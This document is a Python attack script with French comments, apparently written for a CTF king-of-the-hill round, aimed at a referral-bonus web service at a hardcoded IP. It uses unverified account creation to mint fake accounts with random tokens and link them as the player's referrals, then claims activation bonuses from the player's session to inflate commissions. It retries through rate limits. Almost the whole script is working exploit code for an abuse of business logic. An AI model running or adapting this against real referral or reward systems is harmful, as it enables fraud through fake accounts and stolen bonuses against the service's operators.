#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : test décisif du générateur de COMMISSIONS.

Idée : si /api/join accepte un jeton arbitraire et crée un compte ACTIVÉ, et
qu'on peut le rattacher à nous comme filleul, alors sa prime d'activation nous
rapporte une commission -> générateur de net_gain.

Ce script : session nous -> mint d'un compte (jeton aléatoire, en tentant de
poser parrain=nous) -> on lit son état (activé ? sponsor ?) -> on tente la prime
depuis notre session. Retry lent. On ne touche à aucune équipe réelle.
"""
import json, time, urllib.request, urllib.error, random
from http.cookiejar import CookieJar

HOST  = "http://13.37.197.230:28493"
TOKEN = "6eefff4072981996"
DELAY, MAX = 8, 10

def make():
    cj = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(op, path, body=None, label=""):
    data = json.dumps(body).encode() if body is not None else None
    for attempt in range(1, MAX + 1):
        req = urllib.request.Request(HOST + path, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST" if body is not None else "GET")
        try:
            with op.open(req, timeout=8) as r:
                txt = r.read().decode(errors="replace")
                print(f"  {label or path} -> {r.status} {txt[:300]}")
                try: return json.loads(txt)
                except Exception: return {}
        except urllib.error.HTTPError as e:
            b = e.read().decode(errors="replace")
            if e.code == 429:
                print(f"  {label or path} -> 429, retente {DELAY}s [{attempt}/{MAX}]"); time.sleep(DELAY); continue
            print(f"  {label or path} -> {e.code} {b[:300]}"); return {}
        except Exception as ex:
            print(f"  {label or path} -> erreur {ex}, retente {DELAY}s"); time.sleep(DELAY); continue
    print(f"  {label or path} -> abandon ({MAX} essais)"); return {}

me_op = make()
print("1) join (nous)"); j = call(me_op, "/api/join", {"token": TOKEN}, "join(us)")
my = j.get("referral_code") or j.get("code")
print("   mon code :", my)

rtok = "".join(random.choice("0123456789abcdef") for _ in range(16))
f_op = make()
print(f"2) mint compte (jeton aléatoire {rtok}, parrain={my})")
jf = call(f_op, "/api/join", {"token": rtok, "parrain_code": my, "referral_code": my}, "join(mint)")
print("3) état du compte minté"); mef = call(f_op, "/api/me", label="me(mint)")
fcode = mef.get("code") or jf.get("code")

print(f"4) depuis NOUS, prime d'activation sur {fcode}")
call(me_op, "/api/bonus/activation", {"filleul_code": fcode}, "bonus(us)")
print("5) notre état final"); fin = call(me_op, "/api/me", label="me(us final)")
print()
print(f"-> compte minté : activated={mef.get('activated')}, sponsor={mef.get('sponsor')}")
print(f"-> nous : net_gain={fin.get('net_gain')}, commissions={fin.get('commissions')}")
print("   Si net_gain monte : générateur trouvé. Sinon colle tout, on tranche la suite.")
